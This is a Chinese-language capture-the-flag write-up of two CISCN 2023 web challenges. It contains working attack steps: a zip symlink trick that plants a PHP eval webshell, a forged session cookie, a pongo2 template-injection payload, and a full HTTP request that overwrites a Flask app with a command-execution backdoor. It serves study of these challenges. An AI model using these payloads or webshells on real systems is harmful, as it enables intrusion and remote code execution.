@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - ciscn2023 web部分</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>ciscn2023 web部分</h1>
+    <p>
+        <span class="meta">发布于: 2024-11-26 04:28</span>
+    </p>
+    <div class="post-body">
+        <p>学习下ciscn2023 web部分</p>
+<!-- more -->
+<h2>unzip</h2>
+<p>复现地址<a href="https://ctf.show/challenges#Unzip-4002">ctfshow ciscn2023 unzip</a></p>
+<p>尝试上传一个图片，上传接口返回处理的源码</p>
+<p><img src="/images/ciscn2023/1.png" alt="1" /></p>
+<pre><code class="language-php">&lt;?php
+# 获取文件MIME类型
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+# 验证MEME类型，判断文件类型是否为zip
+if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
+# 移动到tmp目录，解压在临时目录里上传的zip文件
+    exec('cd /tmp &amp;&amp; unzip -o ' . $_FILES["file"]["tmp_name"]);
+};</code></pre>
+<p>分析一下：</p>
+<ul>
+<li>上传zip文件，解压到<code>/tmp</code>目录</li>
+<li><code>unzip -o</code>参数，如果zip文件中存在同名文件，则覆盖</li>
+</ul>
+<p>通过上面两步操作，可以和linux<code>软链接</code>结合起来实现以下功能：</p>
+<ul>
+<li>创建一个软链接文件<code>link</code>，指向网站根目录<code>/var/www/html</code>，压缩上传</li>
+<li>创建同名文件夹<code>link</code>，在文件夹里创建木马文件，在使在解压后能够覆盖<code>link</code>文件即<code>/var/www/html</code>目录，可以实现把木马解压到<code>/var/www/html</code>目录getshell</li>
+</ul>
+<p>在第一步创建<code>link</code>软连接文件压缩后，<strong>记得删除，否则无法创建同名文件夹<code>link</code></strong>，是否一定要同名文件夹？是，否则前面创建的软连接没有意义</p>
+<p>演示：</p>
+<p>在本地创建<code>link</code>软连接文件，指向<code>/var/www/html</code>目录</p>
+<pre><code class="language-bash"># 创建软连接
+ln -s /var/www/html link
+# 压缩
+zip --symlinks link.zip link</code></pre>
+<p><img src="/images/ciscn2023/2.png" alt="2" /></p>
+<p>删除<code>link</code>软连接文件，创建同名文件夹<code>link</code>，在文件夹里创建<code>shell.php</code>文件</p>
+<pre><code class="language-bash"># 删除软连接
+rm link
+# 创建文件夹，进入
+mkdir link
+cd link
+# 写个🐎子
+echo '&lt;?php highlight_file(__FILE__);eval($_GET[1]);phpinfo();?&gt;' &gt; shell.php
+# 移动到上一级，压缩
+zip -r link1.zip ./link/*</code></pre>
+<p><img src="/images/ciscn2023/3.png" alt="3" /></p>
+<p>现在，可以先上传<code>link.zip</code>文件，实现解压后的<code>link</code>链接到<code>/var/www/html</code>目录，再上传<code>link1.zip</code>文件，把写好的木马直接解压到<code>/var/www/html</code>目录getshell，如果木马文件名为<code>upload.php</code>,<code>index.php</code>应该还可以覆盖原文件</p>
+<p>访问木马路径</p>
+<p><img src="/images/ciscn2023/4.png" alt="4" /></p>
+<h2>go_session</h2>
+<p>考点：</p>
+<blockquote>
+<p>session伪造，pongo2模板注入，debug模式覆盖源文件，通过go的模板渲染修改debug模式下的flask，打一个ssrf</p>
+</blockquote>
+<p>这道题是go,python的模板渲染引擎联动，有go web服务和python web服务</p>
+<ul>
+<li><a href="https://go-macaron.com/zh-cn/middlewares/templating">pongo2模板引擎</a></li>
+</ul>
+<p>main.go使用go搭建的web服务，定义了三个路由，<code>/</code>、<code>/admin</code>、<code>/flask</code>，可以猜测<code>/flask</code>路由下是python web服务</p>
+<ul>
+<li>
+<p><code>github.com/gin-gonic/gin</code>：导入 Gin 框架包，提供了 web 路由和 HTTP 请求处理功能</p>
+</li>
+<li>
+<p><code>main/route</code>：导入项目中的 <code>route</code> 包，这个包应该包含了与路由相关的处理函数</p>
+</li>
+</ul>
+<pre><code class="language-go">package main
+
+import (
+        "github.com/gin-gonic/gin"
+        "main/route"
+)
+
+func main() {
+        r := gin.Default()
+        r.GET("/", route.Index)
+        r.GET("/admin", route.Admin)
+        r.GET("/flask", route.Flask)
+        r.Run("0.0.0.0:80")
+}</code></pre>
+<p><code>route/route.go</code>源码</p>
+<p>这是一个路由文件，使用了Gin框架和pongo2的模板引擎，定义了三个路由处理函数：<code>Index</code>、<code>Admin</code>和<code>Flask</code></p>
+<pre><code class="language-go">package route
+
+import (
+        "github.com/flosch/pongo2/v6"
+        "github.com/gin-gonic/gin"
+        "github.com/gorilla/sessions"
+        "html"
+        "io"
+        "net/http"
+        "os"
+)
+
+var store = sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))
+
+func Index(c *gin.Context) {
+        session, err := store.Get(c.Request, "session-name")
+        if err != nil {
+                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+                return
+        }
+        if session.Values["name"] == nil {
+                session.Values["name"] = "guest"
+                err = session.Save(c.Request, c.Writer)
+                if err != nil {
+                        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+                        return
+                }
+        }
+
+        c.String(200, "Hello, guest")
+}
+
+func Admin(c *gin.Context) {
+        session, err := store.Get(c.Request, "session-name")
+        if err != nil {
+                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+                return
+        }
+        if session.Values["name"] != "admin" {
+                http.Error(c.Writer, "N0", http.StatusInternalServerError)
+                return
+        }
+        name := c.DefaultQuery("name", "ssti")
+        xssWaf := html.EscapeString(name)
+        tpl, err := pongo2.FromString("Hello " + xssWaf + "!")
+        if err != nil {
+                panic(err)
+        }
+        out, err := tpl.Execute(pongo2.Context{"c": c})
+        if err != nil {
+                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+                return
+        }
+        c.String(200, out)
+}
+
+func Flask(c *gin.Context) {
+        session, err := store.Get(c.Request, "session-name")
+        if err != nil {
+                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+                return
+        }
+        if session.Values["name"] == nil {
+                if err != nil {
+                        http.Error(c.Writer, "N0", http.StatusInternalServerError)
+                        return
+                }
+        }
+        resp, err := http.Get("http://127.0.0.1:5000/" + c.DefaultQuery("name", "guest"))
+        if err != nil {
+                return
+        }
+        defer resp.Body.Close()
+        body, _ := io.ReadAll(resp.Body)
+
+        c.String(200, string(body))
+}</code></pre>
+<p>简单分析：</p>
+<ul>
+<li>Index：获取session，如果session中name为空，则设置name为guest，返回字符串"Hello, guest"</li>
+<li>Admin：获取session，如果session中name不为admin，则返回"NO"，否则获取name参数，经过html转义后，使用pongo2模板引擎渲染字符串"Hello " + xssWaf + "!"，返回渲染后的字符串</li>
+<li>Flask：获取session，如果session中name为空，则返回"NO"，否则向http://127.0.0.1:5000/发送GET请求，获取响应体，返回响应体</li>
+</ul>
+<p>其中在<code>Index</code>函数参数传的是<code>gin.Context</code>，类似flask的<code>flask.Request</code> 或 <code>flask.g</code>，包含了当前http请求和响应的信息、操作方法和属性的结构体，用于在处理http请求时传递和操作这些信息。同时gin.Context还提供了一系列的方法用于处理这些信息，这个将是我们后面利用的重点</p>
+<pre><code class="language-go">func Index(c *gin.Context) {
+        session, err := store.Get(c.Request, "session-name")
+        if err != nil {
+                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+                return
+        }
+        if session.Values["name"] == nil {
+                session.Values["name"] = "guest"
+                err = session.Save(c.Request, c.Writer)
+                if err != nil {
+                        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+                        return
+                }
+        }
+        c.String(200, "Hello, guest")
+}</code></pre>
+<p>在Admin函数里，获取session中name的值是否为<code>admin</code>，如果不是，程序停止。如果<code>name</code>的值是<code>admin</code>，使用<code>name := c.DefaultQuery("name", "ssti")</code>获取查询参数<code>name</code>的值，如果<code>name</code>不存在，则默认为<code>ssti</code>。然后使用<code>html.EscapeString(name)</code>对<code>name</code>进行html转义，防止xss攻击。接着使用<code>pongo2</code>模板引擎渲染字符串<code>Hello " + xssWaf + "!"</code></p>
+<pre><code class="language-go">func Admin(c *gin.Context) {
+        session, err := store.Get(c.Request, "session-name")
+        if err != nil {
+                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+                return
+        }
+        if session.Values["name"] != "admin" {
+                http.Error(c.Writer, "N0", http.StatusInternalServerError)
+                return
+        }
+        name := c.DefaultQuery("name", "ssti")
+        xssWaf := html.EscapeString(name)
+        tpl, err := pongo2.FromString("Hello " + xssWaf + "!")
+        if err != nil {
+                panic(err)
+        }
+        out, err := tpl.Execute(pongo2.Context{"c": c})
+        if err != nil {
+                http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
+                return
+        }
+        c.String(200, out)
+}</code></pre>
+<p>在<code>Flask</code>函数里，关键在接收一个name参数，发给本地的5000端口处理，返回结果。需要这样传参<code>url?name=?name=123</code>，键名<code>?name=</code>直接传给go web，键值<code>?name=123</code>传给flask</p>
+<pre><code class="language-go">resp, err := http.Get("http://127.0.0.1:5000/" + c.DefaultQuery("name", "guest"))</code></pre>
+<p>先尝试伪造session，session的密钥在<code>route/route.go</code>源码里提到了<code>session_key</code>的获取方式，从系统变量里获取，没办法获取，大胆猜测环境变量<code>session_key</code>为空，本地搭一个环境看看<code>admin</code>的session值</p>
+<pre><code class="language-go">var store = sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))</code></pre>
+<p>本地修改<code>route/route.go</code>的route函数源码，把给所有用户设为<code>admin</code>的session，方便拿到</p>
+<p><img src="/images/ciscn2023/5.png" alt="5" /></p>
+<p>使用go官方的代理，加速依赖下载及github相关依赖的访问，运行main.go</p>
+<pre><code class="language-bash">sudo go env -w GOPROXY=https://goproxy.io,direct
+sudo go run main.go</code></pre>
+<p><img src="/images/ciscn2023/6.png" alt="6" /></p>
+<p>访问80端口拿到<code>admin</code>的session，把伪造的session替换到题目里，到admin路由，发现渲染了<code>hello ssti</code>，说明伪造成功了</p>
+<p>访问<code>flask</code>路由传入name参数，返回了flask的debug的文本信息，太丑了，可以找到flask应用的路径<code>/app/server.py</code></p>
+<p><img src="/images/ciscn2023/7.png" alt="7" /></p>
+<p>flask是开启debug模式的，<code>server.py</code>源码修改时会自动重启</p>
+<p>在go的<code>gin</code>模板引擎里，<code>SaveUploadedFile()</code>函数接口可以实现文件上传</p>
+<pre><code class="language-go">func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error</code></pre>
+<p>第一个参数获取表单上传的文件，第二个参数是保存的路径</p>
+<p>构造payload：</p>
+<pre><code class="language-go">{{c.SaveUploadedFile(c.FormFile("file"),"/app/server.py")}}</code></pre>
+<p>在Index函数里，使用了<code>html.EscapeString()</code>函数对<code>name</code>进行html转义，会影响这个payload里的引号</p>
+<p>想办法用其他方法替换</p>
+<ul>
+<li>第一个参数：<code>c.FormFile("file")</code>就是前端写的上传的name的值，在这里就是file，只要能用<code>gin</code>模板引擎获取一个字符串放在这里占位与后面文件上传时的name保持一致即可</li>
+<li>第二个参数：<code>/app/server.py</code>，师傅们使用的是<code>c.Request.Referer()</code>从http头里获取的referer。我在想为什么第一个参数不这么做呢？</li>
+</ul>
+<p>第一个参数的解决办法：</p>
+<ul>
+<li><code>Context.HandlerName()</code>：</li>
+</ul>
+<pre><code class="language-go">HandlerName
+返回主处理程序的处理器函数名称。例如，如果处理程序是“handleGetUsers()”，此函数将返回“main.handleGetUsers”</code></pre>
+<p>在<code>main.go</code>里，所以如果是在Admin()函数里调用，返回的就是main/route.Admin，在Index()里，返回的就是main/route.Index</p>
+<p>这里执行go ssti模块在main.go的Admin里，<code>Context.HandlerName()</code>可以获取到<code>main/route.Admin</code>，配合<code>last</code>过滤器获取最后一个字符串<code>n</code>作为文件名</p>
+<p>第二个参数：</p>
+<p>直接拿<code>Context</code>的http请求头里的内容，<code>c.Request.Referer()</code>，获取referer<code>/app/server.py</code></p>
+<p>payload：</p>
+<pre><code class="language-go">{{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}}</code></pre>
+<p>有了payload，用bp上传一个server.py文件，覆盖原有的server.py文件，执行命令</p>
+<p>拿一个师傅的poc，复制到bp的<code>Repeate</code>模块把host，session替换掉，<code>server.py</code>可以自己修改</p>
+<pre><code class="language-plaintext">GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}} HTTP/1.1
+Host: 35e1a5bc-b6c3-4cbb-a4cd-10a1442dd09d.challenge.ctf.show
+Referer: /app/server.py
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie:session-name=MTczMjYxNzExMHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzHBTGHoCnNu3cFSjoBf3yDewNXiCPuYMFdWsXNLwgXAA==
+Upgrade-Insecure-Requests: 1
+Content-Length: 425
+
+------WebKitFormBoundary8ALIn5Z2C3VlBqND
+Content-Disposition: form-data; name="n"; filename="1.py"
+Content-Type: text/plain
+
+from flask import *
+import os
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    name = request.args['name']
+    file=os.popen(name).read()
+    return file
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
+------WebKitFormBoundary8ALIn5Z2C3VlBqND--</code></pre>
+<p>上传成功</p>
+<p><img src="/images/ciscn2023/11.png" alt="11" /></p>
+<p>访问flask路由执行命令</p>
+<p><img src="/images/ciscn2023/12.png" alt="12" /></p>
+<pre><code class="language-plaintext">其他尝试：在payload`{{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}}`里，第一个参数不理解为什么这样拿一个字符串，不是直接在http参数了拿</code></pre>
+<p>好吧，拷打了一下gpt，好像吗真的有限？看起来只有<code>c.ClientIP(),c.Request.Host,c.Request.Referer(),c.Request.RemoteAddr</code>这几个有利用的可能。查阅一下，<code>c.Request.RemoteAddr</code>获取的是tcp协议的网络底层ip，貌似控制不了，<code>c.ClientIP()</code>获取的X-Forwarded-For头，可以尝试伪造一下，<code>c.Request.Host</code>获取的是http头里的host，bp伪造了好像就不能发包了，<code>c.Request.Referer()</code>获取的是http头里的referer，可以伪造</p>
+<pre><code class="language-go">c.GetHeader("User-Agent")
+c.GetHeader("Content-Type")
+c.FullPath()
+c.DefaultQuery("name", "guest")
+c.Param("userID")
+c.Request.Method
+c.Cookie("session_id")
+c.ClientIP()
+c.Request.Proto
+c.GetHeader("User-Agent")
+c.Request.Referer()
+c.Request.Host
+c.Request.RemoteAddr</code></pre>
+<p>陌生，看不懂。熟悉，失败了</p>
+<pre><code class="language-plaintext">[Error (where: execution) in &lt;string&gt; | Line 1 Col 9 near 'c'] [Error (where: execution) in &lt;string&gt; | Line 1 Col 28 near 'c'] http: no such file</code></pre>
+<p><img src="/images/ciscn2023/13.png" alt="13" /></p>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.cnblogs.com/gxngxngxn/p/17439035.html">【CISCN2023】unzip 详解</a></li>
+<li><a href="https://xz.aliyun.com/t/2589?time__1311=n4%2Bxni0%3DG%3Di%3D0QAeGNDQTcqYqeGTZxY5vd4x">一个有趣的任意文件读取</a></li>
+<li><a href="https://ctf.show">ctfshow</a></li>
+<li><a href="https://blog.csdn.net/m0_73512445/article/details/134261219">[CISCN 2023 初赛]go_session</a></li>
+<li><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18155714">CISCN2023初赛-web复现</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>wp</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#wp</span>
+                                    <span>#ctf</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
